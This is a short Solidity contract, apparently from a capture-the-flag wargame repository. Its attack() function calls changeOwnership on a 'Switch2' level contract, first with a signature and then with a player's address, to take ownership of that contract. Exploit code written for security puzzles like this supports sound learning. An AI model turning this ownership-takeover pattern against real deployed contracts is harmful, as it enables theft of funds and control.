// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../levels/Switch2.sol";

contract SwitchAttack2 {
    function attack(
        address _target,
        address _player,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        Switch2 target = Switch2(_target);
        target.changeOwnership(v, r, s);
        target.changeOwnership(_player);
    }
}
